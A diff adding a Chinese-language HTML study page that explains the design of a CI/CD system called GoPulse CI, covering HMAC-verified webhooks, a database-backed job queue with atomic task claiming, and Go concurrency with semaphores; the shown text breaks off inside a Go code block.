@@ -1,0 +1,1166 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GoPulse CI · 全流程原理详解</title>
+<style>
+:root{
+  --bg:#080d17; --panel:#0f1728; --panel2:#141f35; --panel3:#1a2743;
+  --line:#243352; --line2:#2f4066;
+  --fg:#e8eefb; --muted:#8ba0c4; --dim:#5f7396;
+  --blue:#4d8dfb; --green:#34d399; --amber:#fbbf24; --red:#f87171; --purple:#a78bfa;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;background:var(--bg);color:var(--fg);
+  font-family:"Microsoft YaHei","PingFang SC","Hiragino Sans GB","Source Han Sans SC",system-ui,-apple-system,sans-serif;
+  font-size:14.5px;line-height:1.75;-webkit-font-smoothing:antialiased;
+}
+a{color:var(--blue)}
+code,kbd,pre{font-family:var(--mono)}
+
+/* ---------- 布局 ---------- */
+.shell{display:grid;grid-template-columns:264px 1fr;max-width:1560px;margin:0 auto}
+@media(max-width:1000px){.shell{grid-template-columns:1fr}.side{display:none}}
+
+.side{
+  position:sticky;top:0;align-self:start;height:100vh;overflow-y:auto;
+  border-right:1px solid var(--line);padding:22px 16px 40px;background:var(--panel);
+}
+.side h2{margin:0 0 3px;font-size:15px;letter-spacing:-.2px}
+.side .tag{color:var(--dim);font-size:11px;margin:0 0 16px;letter-spacing:.06em}
+.side input{
+  width:100%;background:var(--bg);border:1px solid var(--line2);color:var(--fg);
+  border-radius:7px;padding:7px 10px;font-size:12.5px;font-family:inherit;margin-bottom:14px;
+}
+.side input:focus{outline:none;border-color:var(--blue)}
+.navgrp{margin-bottom:14px}
+.navgrp>.lbl{font-size:10.5px;letter-spacing:.11em;text-transform:uppercase;color:var(--dim);
+  font-weight:700;margin:0 0 6px;padding-left:8px}
+.nav a{
+  display:flex;align-items:baseline;gap:7px;padding:5px 8px;border-radius:6px;
+  color:var(--muted);text-decoration:none;font-size:12.5px;line-height:1.45;transition:.13s;
+  border-left:2px solid transparent;
+}
+.nav a:hover{background:var(--panel2);color:var(--fg)}
+.nav a.on{background:var(--panel3);color:#fff;border-left-color:var(--blue)}
+.nav a .n{font-family:var(--mono);font-size:11px;color:var(--dim);flex:none;width:18px}
+.nav a.on .n{color:var(--blue)}
+.nav a.hide{display:none}
+.nav .st{margin-left:auto;font-size:9.5px;flex:none;opacity:.85}
+
+.main{padding:30px 40px 90px;min-width:0}
+@media(max-width:1000px){.main{padding:22px 18px 60px}}
+
+/* ---------- 页头 ---------- */
+header.top{border-bottom:1px solid var(--line);padding-bottom:20px;margin-bottom:28px}
+h1{margin:0 0 6px;font-size:24px;letter-spacing:-.3px}
+.lede{color:var(--muted);margin:0 0 16px;font-size:13.5px;max-width:900px}
+.legend{display:flex;gap:8px;flex-wrap:wrap;font-size:11.5px}
+.chip{display:inline-flex;align-items:center;gap:5px;border:1px solid var(--line2);
+  background:var(--panel2);border-radius:20px;padding:3px 11px;color:var(--muted)}
+.chip b{font-weight:600}
+.chip.done{border-color:#1d5c46;color:#7ee2b8;background:#0d231c}
+.chip.plan{border-color:#5a4410;color:#e5c07b;background:#1d1708}
+
+/* ---------- 进度条 ---------- */
+.prog{position:sticky;top:0;z-index:20;background:rgba(8,13,23,.94);backdrop-filter:blur(6px);
+  border-bottom:1px solid var(--line);margin:-30px -40px 26px;padding:9px 40px;
+  display:flex;align-items:center;gap:12px;font-size:11.5px;color:var(--dim)}
+@media(max-width:1000px){.prog{margin:-22px -18px 20px;padding:9px 18px}}
+.prog .bar{flex:1;height:4px;background:var(--panel3);border-radius:3px;overflow:hidden}
+.prog .bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--blue),var(--green));
+  transition:width .18s}
+.prog button{background:var(--panel2);border:1px solid var(--line2);color:var(--muted);
+  border-radius:6px;padding:3px 10px;font-size:11px;cursor:pointer;font-family:inherit}
+.prog button:hover{color:var(--fg);border-color:var(--blue)}
+
+/* ---------- 站点 ---------- */
+.station{scroll-margin-top:64px;margin-bottom:34px;border:1px solid var(--line);
+  border-radius:13px;background:var(--panel);overflow:hidden}
+.station.done{border-color:#1d5c46}
+.station.plan{border-color:#4a3a12}
+.shead{padding:16px 20px 14px;border-bottom:1px solid var(--line);
+  display:flex;align-items:flex-start;gap:13px;cursor:pointer;user-select:none}
+.station.done .shead{background:linear-gradient(180deg,#0c211b,#0f1728)}
+.station.plan .shead{background:linear-gradient(180deg,#1c1608,#0f1728)}
+.snum{font-family:var(--mono);font-size:19px;font-weight:700;color:var(--blue);flex:none;
+  width:30px;line-height:1.3}
+.station.plan .snum{color:var(--amber)}
+.stitle{flex:1;min-width:0}
+.stitle h2{margin:0;font-size:16.5px;letter-spacing:-.2px;line-height:1.4}
+.stitle .sub{color:var(--muted);font-size:12.5px;margin:3px 0 0;line-height:1.55}
+.sbadge{flex:none;display:flex;gap:6px;align-items:center;padding-top:3px}
+.b{font-size:10px;letter-spacing:.05em;border-radius:4px;padding:2px 7px;font-weight:600;white-space:nowrap}
+.b.done{background:#12352a;color:#7ee2b8;border:1px solid #1d5c46}
+.b.plan{background:#2a2110;color:#e5c07b;border:1px solid #5a4410}
+.b.part{background:#101f38;color:#8fc0ff;border:1px solid #1e3a80}
+.chev{flex:none;color:var(--dim);transition:transform .2s;font-size:12px;padding-top:5px}
+.station.fold .chev{transform:rotate(-90deg)}
+.station.fold .sbody{display:none}
+.sbody{padding:18px 20px 20px}
+
+/* ---------- 内容块 ---------- */
+.blk{margin-bottom:18px}
+.blk:last-child{margin-bottom:0}
+.blk>h3{margin:0 0 9px;font-size:12px;letter-spacing:.09em;text-transform:uppercase;
+  color:var(--dim);font-weight:700;display:flex;align-items:center;gap:7px}
+.blk>h3::before{content:"";width:3px;height:12px;background:var(--line2);border-radius:2px}
+.blk>h3.k-warn::before{background:var(--red)}
+.blk>h3.k-tip::before{background:var(--green)}
+.blk>h3.k-code::before{background:var(--purple)}
+.blk>h3.k-analogy::before{background:var(--amber)}
+.blk p{margin:0 0 9px}
+.blk p:last-child{margin-bottom:0}
+.blk strong{color:#fff;font-weight:600}
+.blk em{color:var(--amber);font-style:normal}
+.blk ul,.blk ol{margin:0 0 9px;padding-left:22px}
+.blk li{margin-bottom:5px}
+.blk li::marker{color:var(--dim)}
+code:not(pre code){background:var(--panel3);border:1px solid var(--line2);border-radius:4px;
+  padding:1px 5px;font-size:12.5px;color:#a8d4ff}
+
+/* 类比框 */
+.analogy{border-left:3px solid var(--amber);background:#1a1608;border-radius:0 8px 8px 0;
+  padding:12px 15px;font-size:13.5px;color:#f0dcae}
+.analogy .t{font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:#c9a44e;
+  font-weight:700;margin-bottom:5px}
+
+/* 坑 / 提示 */
+.warn,.tip{border-radius:8px;padding:12px 15px;font-size:13.5px}
+.warn{background:#1e1010;border:1px solid #5c2020;border-left:3px solid var(--red)}
+.tip{background:#0d231c;border:1px solid #1d5c46;border-left:3px solid var(--green)}
+.warn .t,.tip .t{font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;font-weight:700;margin-bottom:5px}
+.warn .t{color:#f08a8a}.tip .t{color:#7ee2b8}
+
+/* 代码块 */
+.codewrap{position:relative}
+.codewrap .lang{position:absolute;top:7px;right:10px;font-size:9.5px;letter-spacing:.09em;
+  text-transform:uppercase;color:var(--dim);font-family:var(--mono)}
+pre{margin:0;background:#060a12;border:1px solid var(--line);border-radius:8px;
+  padding:13px 15px;overflow-x:auto;font-size:12.3px;line-height:1.68;color:#cfe0f5}
+pre .c{color:#5f7396;font-style:italic}
+pre .k{color:#7aa7ff}
+pre .s{color:#8ee6b0}
+pre .n{color:#e5c07b}
+pre .bad{color:#ff9b9b}
+pre .good{color:#7ee2b8}
+
+/* 表格 */
+.tw{overflow-x:auto;border:1px solid var(--line);border-radius:8px}
+table{border-collapse:collapse;width:100%;font-size:12.8px}
+th,td{text-align:left;padding:8px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--panel2);color:var(--muted);font-weight:600;font-size:11.5px;
+  letter-spacing:.05em;white-space:nowrap}
+tr:last-child td{border-bottom:none}
+tbody tr:hover{background:var(--panel2)}
+td.mono,th.mono{font-family:var(--mono);font-size:12px}
+td .yes{color:var(--green)}td .no{color:var(--red)}
+
+/* 流程图 */
+.flow{background:#060a12;border:1px solid var(--line);border-radius:8px;padding:15px;
+  overflow-x:auto;font-family:var(--mono);font-size:12px;line-height:1.6;
+  white-space:pre;color:#9fc4ee}
+
+/* 键值对 */
+.kv{display:grid;grid-template-columns:minmax(120px,auto) 1fr;gap:0;
+  border:1px solid var(--line);border-radius:8px;overflow:hidden;font-size:13px}
+.kv>div{padding:8px 13px;border-bottom:1px solid var(--line)}
+.kv>div:nth-child(4n+1),.kv>div:nth-child(4n+2){background:var(--panel2)}
+.kv .k{color:var(--muted);font-weight:600}
+.kv>div:nth-last-child(-n+2){border-bottom:none}
+
+/* 总览动画 */
+.pipeline{border:1px solid var(--line);border-radius:13px;background:var(--panel);padding:20px;margin-bottom:30px}
+.pipeline h2{margin:0 0 4px;font-size:16px}
+.pipeline .sub{color:var(--muted);font-size:12.5px;margin:0 0 18px}
+.prow{display:flex;gap:7px;flex-wrap:wrap;align-items:stretch}
+.pnode{flex:1 1 108px;min-width:104px;border:1px solid var(--line2);border-radius:8px;
+  background:var(--panel2);padding:9px 10px;cursor:pointer;transition:.2s;position:relative;
+  text-decoration:none;color:inherit;display:block}
+.pnode:hover{border-color:var(--blue);transform:translateY(-2px)}
+.pnode .pn{font-family:var(--mono);font-size:10px;color:var(--dim)}
+.pnode .pt{font-size:12px;font-weight:600;margin-top:2px;line-height:1.35}
+.pnode.act{border-color:var(--blue);background:#16233d;box-shadow:0 0 0 1px var(--blue),0 8px 24px -12px var(--blue)}
+.pnode.act .pn{color:var(--blue)}
+.pnode.ok{border-color:#1d5c46;background:#0d231c}
+.pnode.ok .pn{color:var(--green)}
+.pnode.fail{border-color:#5c2020;background:#1e1010}
+.pnode.fail .pn{color:var(--red)}
+.pctl{display:flex;gap:8px;align-items:center;margin-top:16px;flex-wrap:wrap}
+.pctl button{background:var(--panel2);border:1px solid var(--line2);color:var(--fg);
+  border-radius:7px;padding:6px 14px;font-size:12.5px;cursor:pointer;font-family:inherit;transition:.15s}
+.pctl button:hover{border-color:var(--blue)}
+.pctl button:disabled{opacity:.4;cursor:not-allowed}
+.pctl .msg{color:var(--muted);font-size:12.5px;flex:1;min-width:200px;font-family:var(--mono)}
+.pctl label{display:flex;align-items:center;gap:6px;font-size:12.5px;color:var(--muted);cursor:pointer}
+
+/* 三主线 */
+.mainlines{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:30px}
+@media(max-width:900px){.mainlines{grid-template-columns:1fr}}
+.ml{border:1px solid var(--line);border-radius:11px;padding:15px 16px;background:var(--panel)}
+.ml h3{margin:0 0 8px;font-size:14px}
+.ml pre{font-size:11.6px;line-height:1.62}
+.ml p{margin:0;color:var(--muted);font-size:12.5px}
+
+footer{border-top:1px solid var(--line);margin-top:40px;padding-top:18px;color:var(--dim);font-size:12px}
+.top-link{position:fixed;right:22px;bottom:22px;width:40px;height:40px;border-radius:50%;
+  background:var(--panel3);border:1px solid var(--line2);color:var(--fg);cursor:pointer;
+  display:none;align-items:center;justify-content:center;font-size:16px;z-index:30}
+.top-link.show{display:flex}
+.top-link:hover{border-color:var(--blue)}
+@media print{
+  .side,.prog,.top-link,.pctl{display:none!important}
+  .shell{display:block}.main{padding:0}
+  .station.fold .sbody{display:block}
+  body{background:#fff;color:#000;font-size:11pt}
+  .station,.pipeline,.ml{break-inside:avoid;border-color:#bbb;background:#fff}
+  pre,.flow{background:#f6f6f6;color:#111;border-color:#ccc}
+  .shead{background:#f0f0f0!important}
+}
+</style>
+</head>
+<body>
+<div class="shell">
+<aside class="side"><h2>GoPulse CI</h2><p class="tag">全流程原理详解 · 学习材料</p><input id="q" type="search" placeholder="搜索章节…" aria-label="搜索章节"><div class="navgrp"><div class="lbl">接入与调度</div><div class="nav"><a href="#s1" data-t="s1"><span class="n">①</span><span>触发</span><span class="st" style="color:#8fc0ff">◐</span></a><a href="#s2" data-t="s2"><span class="n">②</span><span>入队</span><span class="st" style="color:#e5c07b">○</span></a><a href="#s3" data-t="s3"><span class="n">③</span><span>并发调度</span><span class="st" style="color:#e5c07b">○</span></a></div></div><div class="navgrp"><div class="lbl">构建执行</div><div class="nav"><a href="#s4" data-t="s4"><span class="n">④</span><span>检出代码</span><span class="st" style="color:#e5c07b">○</span></a><a href="#s5" data-t="s5"><span class="n">⑤</span><span>类型检测</span><span class="st" style="color:#e5c07b">○</span></a><a href="#s6" data-t="s6"><span class="n">⑥</span><span>Docker 构建</span><span class="st" style="color:#e5c07b">○</span></a><a href="#s7" data-t="s7"><span class="n">⑦</span><span>日志管道</span><span class="st" style="color:#8fc0ff">◐</span></a><a href="#s8" data-t="s8"><span class="n">⑧</span><span>产物与镜像 tag</span><span class="st" style="color:#e5c07b">○</span></a></div></div><div class="navgrp"><div class="lbl">部署与状态</div><div class="nav"><a href="#s9" data-t="s9"><span class="n">⑨</span><span>部署</span><span class="st" style="color:#e5c07b">○</span></a><a href="#s10" data-t="s10"><span class="n">⑩</span><span>健康检查</span><span class="st" style="color:#e5c07b">○</span></a><a href="#s11" data-t="s11"><span class="n">⑪</span><span>状态机</span><span class="st" style="color:#e5c07b">○</span></a></div></div><div class="navgrp"><div class="lbl">智能诊断</div><div class="nav"><a href="#s12" data-t="s12"><span class="n">⑫</span><span>失败诊断与 LOA</span><span class="st" style="color:#e5c07b">○</span></a></div></div><div class="navgrp"><div class="lbl">工程实现</div><div class="nav"><a href="#s13" data-t="s13"><span class="n">⑬</span><span>前端</span><span class="st" style="color:#7ee2b8">●</span></a><a href="#s14" data-t="s14"><span class="n">⑭</span><span>数据是怎么存的</span><span class="st" style="color:#e5c07b">○</span></a><a href="#s15" data-t="s15"><span class="n">⑮</span><span>整个系统的进程模型</span><span class="st" style="color:#e5c07b">○</span></a></div></div></aside>
+<main class="main">
+<header class="top"><h1>从 git push 到自动部署：全流程原理详解</h1><p class="lede">15 个站点，每站按「发生了什么 → 小白类比 → 技术细节 → 踩过的坑」四层展开。写给自己复习用，也可以直接拿去给同学讲。<strong>注意每站右上角的实现状态标记</strong> —— 标「后端待实现」的部分是<em>设计原理</em>，不是已运行的代码。</p><div class="legend"><span class="chip done"><b>1</b> 站前端已实现</span><span class="chip"><b>2</b> 站前后端都有（前端 ✅ / 后端 ⬜）</span><span class="chip plan"><b>12</b> 站后端待实现（仅有设计）</span><span class="chip">共 15 站 · 含代码与流程图</span></div></header>
+<div class="prog"><span>阅读进度</span><div class="bar"><i id="prog-fill"></i></div><span id="prog-pct">0%</span><button id="btn-fold">全部折叠</button></div>
+
+<div class="pipeline">
+  <h2>一次 push 的完整旅程</h2>
+  <p class="sub">点「播放」看整条链路走完；勾选「模拟构建失败」会在第 ⑥ 步中断并转入诊断。
+     点任意节点直接跳到该站的详细讲解。</p>
+  <div class="prow"><a class="pnode" data-goto="s1" data-msg="git push → GitHub 发出 webhook POST"><div class="pn">1</div><div class="pt">触发</div></a><a class="pnode" data-goto="s2" data-msg="验签 → 限长 → 写 queued 记录 → 立刻回 202"><div class="pn">2</div><div class="pt">入队</div></a><a class="pnode" data-goto="s3" data-msg="原子认领任务 → 占一个车位 → 开 goroutine"><div class="pn">3</div><div class="pt">调度</div></a><a class="pnode" data-goto="s4" data-msg="Go 侧 git fetch <sha> --depth=1（凭据不进容器）"><div class="pn">4</div><div class="pt">检出</div></a><a class="pnode" data-goto="s5" data-msg="扫标记文件 → 推断类型 → 生成 Pipeline 快照"><div class="pn">5</div><div class="pt">检测</div></a><a class="pnode" data-goto="s6" data-msg="容器内 install → build，退出码判定成败"><div class="pn">6</div><div class="pt">构建</div></a><a class="pnode" data-goto="s7" data-msg="fan-out → 环形缓冲 + 批量落库 + SSE 实时推送"><div class="pn">7</div><div class="pt">日志</div></a><a class="pnode" data-goto="s8" data-msg="docker commit → web-api:a3f9c21（不可变 tag）"><div class="pn">8</div><div class="pt">产物</div></a><a class="pnode" data-goto="s9" data-msg="SSH（校验 Host Key）→ docker-compose up -d"><div class="pn">9</div><div class="pt">部署</div></a><a class="pnode" data-goto="s10" data-msg="GET /healthz 连续 3 次 200 → deployed；失败 → 自动回滚"><div class="pn">10</div><div class="pt">健康检查</div></a><a class="pnode" data-goto="s11" data-msg="9 个状态、只允许沿边迁移、每次迁移写审计"><div class="pn">11</div><div class="pt">状态机</div></a><a class="pnode" data-goto="s12" data-msg="LOA 策略引擎 → analyzer → 证据链诊断 → 人做决策"><div class="pn">12</div><div class="pt">诊断</div></a></div>
+  <div class="pctl">
+    <button id="pbtn">▶ 播放全流程</button>
+    <label><input type="checkbox" id="chk-fail"> 模拟构建失败（走诊断路径）</label>
+    <span class="msg" id="pmsg">待播放 · 共 12 站</span>
+  </div>
+</div><section class="station plan" id="s1"><div class="shead"><span class="snum">①</span><div class="stitle"><h2>触发：webhook 如何做到「一推就跑」</h2><p class="sub">你敲下 git push 之后，代码变更如何变成一个构建任务</p></div><span class="sbadge"><span class="b part">前端已实现</span><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p><strong>发生了什么：</strong>你在 GitHub 仓库设置里填了一个 URL 和一个密钥。从此每次 push，
+GitHub <em>主动</em>向这个 URL 发一个 HTTP POST 请求，请求体是一个 JSON，写着：谁推的、推到哪个分支、
+commit 的 SHA、提交信息。</p>
+<p>GoPulse 收到后做四件事：<strong>验签 → 限长 → 解析入队 → 立刻回 202</strong>。真正的构建在后台异步进行。</p></div><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+把 webhook 想成<strong>外卖平台的接单提醒</strong>。<br><br>
+轮询（polling）= 你每隔一分钟打电话问餐厅「有我的单子吗」—— 99% 的电话都白打，而且平均要等半分钟才知道。<br>
+webhook = 餐厅一有新单子就<strong>主动打你电话</strong>—— 零延迟，零无效通话。<br><br>
+「hook（钩子）」的意思就是：你在别人的系统上挂了一个钩子，事情发生时它来拉你。</div></div><div class="blk"><h3>轮询 vs webhook</h3><div class="tw"><table><thead><tr><th>维度</th><th>轮询（每分钟问一次）</th><th>webhook（事件推送）</th></tr></thead><tbody><tr><td>延迟</td><td>平均 30 秒（取决于间隔）</td><td><span class='yes'>毫秒级</span></td></tr><tr><td>无效请求</td><td>99% 得到「没变化」</td><td><span class='yes'>0</span></td></tr><tr><td>平台侧压力</td><td>每仓库每分钟一次</td><td><span class='yes'>只在真有事时一次</span></td></tr><tr><td>实现复杂度</td><td>简单</td><td>需要公网可达地址 + 验签</td></tr></tbody></table></div></div><div class="blk">
+<p><strong>为什么必须验签：</strong>你的 webhook URL 是公网可访问的。<em>任何人都能往这个 URL POST 一个假 JSON</em>，
+声称「某仓库刚 push 了」，然后你的系统就会去构建一个不存在的 commit，或者被恶意触发去部署。</p>
+<p>防御手段是 <strong>HMAC-SHA256 签名</strong>：</p></div><div class="blk"><h3>HMAC 验签原理</h3><div class="flow">GitHub 侧：  用【共享密钥】对【请求体原文】算一个哈希 ──▶ 放进请求头
+                                                        X-Hub-Signature-256: sha256=5d41402abc...
+
+GoPulse 侧： 用【同一个密钥】对【收到的请求体】算哈希 ──▶ 和请求头比对
+                                                        │
+                          ┌─────────────────────────────┴──────────────┐
+                          ▼                                            ▼
+                    一致 → 确实是 GitHub 发的，且内容未被篡改      不一致 → 401 直接拒绝</div></div><div class="blk"><h3>HMAC 的四个安全性质</h3><div class="kv"><div class="k">哈希不可逆</div><div>拿到签名反推不出密钥</div><div class="k">密钥不上网</div><div>网络上传输的只有哈希结果，密钥双方各自保存</div><div class="k">改一字节全变</div><div>内容不可能被中途篡改而不被发现</div><div class="k">每项目独立密钥</div><div>一个项目的密钥泄漏，不影响其他项目</div></div></div><div class="blk"><h3 class="k-code">三个必须做的防御（缺一即漏洞）</h3><div class="codewrap"><span class="lang">go</span><pre><span class="c">// ① 限制请求体大小 —— 防止有人 POST 一个 10GB 的 JSON 撑爆内存</span>
+body, _ := io.ReadAll(io.LimitReader(r.Body, <span class="n">1&lt;&lt;20</span>))   <span class="c">// 最多 1MB</span>
+
+<span class="c">// ② 验签</span>
+<span class="k">if</span> !verifyHMAC(r.Header.Get(<span class="s">"X-Hub-Signature-256"</span>), body, secret) {
+    http.Error(w, <span class="s">"bad signature"</span>, http.StatusUnauthorized)
+    <span class="k">return</span>
+}
+
+<span class="c">// ③ 解析成内部事件 → 入队 → 立刻应答。绝不在这里构建。</span>
+queue.Enqueue(ctx, BuildRequest{RepoFullName: ev.Repository.FullName,
+                                CommitSHA: ev.After, Ref: ev.Ref})
+w.WriteHeader(http.StatusAccepted)   <span class="c">// 202，不是 200</span></pre></div></div><div class="blk"><h3 class="k-warn">最容易被新手写错的坑：同步构建</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+GitHub 的 webhook 有 <strong>10 秒超时</strong>，而一次构建要几分钟。如果你在 webhook 处理函数里同步执行构建：</div></div><div class="blk"><h3>流程</h3><div class="flow">GitHub 等 10 秒 ──▶ 超时 ──▶ 认为你挂了 ──▶ 标记 webhook 失败 ──▶ 稍后重试
+                                                                    │
+                                        ┌───────────────────────────┘
+                                        ▼
+                              你又构建一次，又超时 ──▶ 无限重试风暴</div></div><div class="blk">
+<p>所以必须<strong>「收到就入队，马上应答」</strong>。这正是 <code>202 Accepted</code>（而不是 <code>200 OK</code>）
+的语义 —— <em>「我接受了你的请求，但还没处理完」</em>。</p></div><div class="blk"><h3 class="k-tip">幂等去重：为什么要做</h3><div class="tip"><div class="t">为什么这样设计</div>
+网络会重试，GitHub 也会重试，同一个 push 可能收到两次 webhook。如果不去重，就会构建两遍、部署两遍。<br><br>
+做法：以 <code>(commit_sha + ref)</code> 作为唯一键，短时间内重复的直接丢弃。<br>
+这个性质叫<strong>幂等（idempotent）</strong>—— 同一操作执行一次和执行多次，结果相同。</div></div></div></section>
+<section class="station plan" id="s2"><div class="shead"><span class="snum">②</span><div class="stitle"><h2>入队：为什么队列必须落数据库</h2><p class="sub">任务如何被安全地暂存，以及两个 worker 同时抢一个任务怎么办</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p><strong>发生了什么：</strong>解析出的信息变成一条 <code>state='queued'</code> 的构建记录写进 SQLite，
+然后这次 HTTP 请求就结束了。构建本身还没开始。</p></div><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>餐厅的取号排队系统。</strong><br><br>
+服务员（webhook 处理函数）不会站在门口给你现做一道菜 —— 他给你一张号码牌，记在本子上，然后立刻接待下一位。<br>
+后厨（Worker Pool）按号码牌顺序出餐。<br><br>
+<strong>关键点：号码牌写在「本子」上，不是记在服务员脑子里。</strong>
+服务员换班（进程重启）了，本子还在，队列不丢。</div></div><div class="blk"><h3>内存队列 vs 数据库队列</h3><div class="tw"><table><thead><tr><th></th><th class="mono">内存 channel</th><th class="mono">数据库表</th></tr></thead><tbody><tr><td>实现</td><td><span class='mono'>make(chan *Job, 100)</span></td><td>一张 builds 表 + state 字段</td></tr><tr><td>进程崩溃</td><td><span class='no'>队列里的任务全丢</span></td><td><span class='yes'>重启后继续处理</span></td></tr><tr><td>可观测性</td><td><span class='no'>看不见队列内容</span></td><td><span class='yes'>可以直接 SQL 查</span></td></tr><tr><td>多实例扩展</td><td><span class='no'>做不到</span></td><td><span class='yes'>天然支持</span></td></tr><tr><td>性能</td><td>极快</td><td>略慢，但对 CI 场景完全够用</td></tr></tbody></table></div></div><div class="blk">
+<p><strong>为什么内存队列是致命的：</strong>CI 服务器恰恰容易崩（OOM、被 kill、机器重启）。
+用内存队列的话，用户 push 了代码，界面上什么都没发生，也不知道为什么 —— 这是最糟糕的体验。
+所以设计上用<strong>数据库表当队列</strong>。</p></div><div class="blk"><h3 class="k-code">部分索引：只给活跃任务建索引</h3><div class="codewrap"><span class="lang">sql</span><pre><span class="k">CREATE TABLE</span> builds (
+    id         <span class="k">INTEGER PRIMARY KEY AUTOINCREMENT</span>,
+    project_id <span class="k">INTEGER NOT NULL REFERENCES</span> projects(id),
+    state      <span class="k">TEXT NOT NULL DEFAULT</span> <span class="s">'queued'</span>,
+    commit_sha <span class="k">TEXT NOT NULL</span>,
+    ...
+);
+
+<span class="c">-- 历史构建可能有几万条，但活跃的永远只有几条。</span>
+<span class="c">-- 部分索引只覆盖活跃状态 → 索引小、查询快。</span>
+<span class="k">CREATE INDEX</span> idx_builds_state <span class="k">ON</span> builds(state)
+    <span class="k">WHERE</span> state <span class="k">IN</span> (<span class="s">'queued'</span>, <span class="s">'running'</span>, <span class="s">'deploying'</span>);</pre></div></div><div class="blk"><h3 class="k-warn">并发编程最经典的坑：两个 worker 抢同一个任务</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+假设两个 worker 同时来取任务，如果「查询」和「更新」是两步：</div></div><div class="blk"><h3>流程</h3><div class="flow">worker A:  SELECT * FROM builds WHERE state='queued' LIMIT 1   ──▶ 拿到 #100
+worker B:  SELECT * FROM builds WHERE state='queued' LIMIT 1   ──▶ 也拿到 #100
+                                                                    │
+                                                                    ▼
+                        两个 worker 都去构建 #100 ──▶ 同一 commit 构建两遍，还可能互相踩</div></div><div class="blk"><h3 class="k-code">解法：把「查询」和「改状态」合并成一个原子操作</h3><div class="codewrap"><span class="lang">sql</span><pre><span class="c">-- SQLite：UPDATE ... RETURNING，数据库保证整条语句原子</span>
+<span class="k">UPDATE</span> builds <span class="k">SET</span> state = <span class="s">'running'</span>, started_at = ?
+<span class="k">WHERE</span> id <span class="k">IN</span> (
+    <span class="k">SELECT</span> id <span class="k">FROM</span> builds <span class="k">WHERE</span> state = <span class="s">'queued'</span>
+    <span class="k">ORDER BY</span> id <span class="k">LIMIT</span> ?
+)
+<span class="k">RETURNING</span> *;
+
+<span class="c">-- PostgreSQL 的等价写法：</span>
+<span class="c">-- SELECT ... FROM builds WHERE state='queued' FOR UPDATE SKIP LOCKED</span></pre></div></div><div class="blk"><h3 class="k-tip">为什么这样</h3><div class="tip"><div class="t">为什么这样设计</div>
+两个 worker 同时执行这条语句，数据库保证<strong>只有一方的 UPDATE 真正影响到那一行</strong>。
+「谁改成功了，任务就是谁的。」—— 不需要应用层加锁，把并发控制交给数据库。</div></div><div class="blk"><h3 class="k-warn">同项目串行化：一个更隐蔽的竞态</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+同一项目的两个构建如果并行部署，会出现<strong>旧版本覆盖新版本</strong>：</div></div><div class="blk"><h3>流程</h3><div class="flow">web-api 项目的 #100（v1.0）和 #101（v1.1）同时部署：
+
+  #100 部署 v1.0 ─────────────────────────▶ 完成（较慢）
+  #101 部署 v1.1 ──────▶ 完成（较快）
+                          │
+                          └──▶ 此刻线上是 v1.1 ✓
+                                                    │
+                                                    ▼
+                              #100 后完成 ──▶ 线上变成 v1.0 ✗ 旧版本覆盖了新版本</div></div><div class="blk">
+<p><strong>解法：</strong>调度器按 <code>project_id</code> 分组 —— <em>同一项目一次只放行一个构建，不同项目之间可以并行</em>。
+这样既保证了正确性，又保留了并发能力。</p></div></div></section>
+<section class="station plan" id="s3"><div class="shead"><span class="snum">③</span><div class="stitle"><h2>并发调度：Go 的看家本领</h2><p class="sub">goroutine、信号量限流、背压、context —— 四个概念讲透</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p>这一节是整个项目<strong>技术含量最高的部分</strong>，也是选 Go 的理由。</p></div><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>goroutine = 轻量级的「工人」。</strong><br><br>
+Java 线程像一个正式员工：招一个要几 MB 的「办公空间」（内存），公司养几千个就吃不消了。<br>
+goroutine 像临时工：只要几 KB，一个程序里开几十万个都没问题。<br><br>
+在 Go 里让一个函数后台并发执行，只需要在调用前加一个关键字：
+<code style="background:#1a2743">go doSomething()</code> —— 就这么简单。<br><br>
+CI 系统的本质就是「同时管很多个正在跑的任务」，正好是 goroutine 的主场。</div></div><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>信号量（semaphore）= 停车场的车位。</strong><br><br>
+不能无限并发：每个构建要起一个 Docker 容器，容器吃内存、吃 CPU、吃磁盘。
+50 个人同时 push 就起 50 个容器，构建机当场 OOM 死机。<br><br>
+所以停车场只有 4 个车位（<code>max_concurrency = 4</code>）：
+车来了有空位就进，没空位在门口排队；车走了腾出一位，放下一辆进来。</div></div><div class="blk"><h3 class="k-code">Go 里用带缓冲 channel 实现信号量 —— 简洁到令人发指</h3><div class="codewrap"><span class="lang">go</span><pre><span class="k">type</span> Pool <span class="k">struct</span> {
+    sem  <span class="k">chan struct</span>{}      <span class="c">// 容量 = 4，就是 4 个车位</span>
+    jobs &lt;-<span class="k">chan</span> *BuildJob
+    wg   sync.WaitGroup
+}
+
+<span class="k">func</span> (p *Pool) Run(ctx context.Context) {
+    <span class="k">for</span> job := <span class="k">range</span> p.jobs {
+        p.sem &lt;- <span class="k">struct</span>{}{}        <span class="c">// 占一个车位。满了就阻塞在这里等</span>
+
+        p.wg.Add(<span class="n">1</span>)
+        <span class="k">go func</span>(j *BuildJob) {
+            <span class="k">defer</span> p.wg.Done()
